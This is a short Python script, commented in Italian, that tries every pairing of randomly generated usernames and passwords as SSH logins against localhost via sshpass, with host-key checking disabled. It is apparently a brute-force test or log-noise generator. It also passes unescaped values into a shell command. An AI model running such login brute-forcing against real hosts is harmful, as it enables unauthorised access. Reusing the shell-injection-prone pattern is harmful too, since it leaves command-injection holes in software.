import subprocess
import random
import string

# Funzione per generare username casuali
def generate_random_usernames(count=5):
    usernames = []
    for _ in range(count):
        username = ''.join(random.choices(string.ascii_lowercase, k=8))
        usernames.append(username)
    return usernames

# Funzione per generare password casuali
def generate_random_passwords(count=5):
    passwords = []
    for _ in range(count):
        password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        passwords.append(password)
    return passwords

# Funzione per tentare l'accesso SSH
def attempt_ssh_login(host, username, password):
    try:
        command = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{host} exit"
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            print(f"Successful login: {username}:{password}")
        else:
            print(f"Failed login: {username}:{password}")
    except Exception as e:
        print(f"Error during login attempt: {e}")

def main():
    # Configura l'host target
    target_host = 'localhost'

    # Genera username e password casuali
    usernames = generate_random_usernames()
    passwords = generate_random_passwords()

    # Esegui tentativi di accesso con tutte le combinazioni di username e password
    for username in usernames:
        for password in passwords:
            attempt_ssh_login(target_host, username, password)

if __name__ == '__main__':
    main()
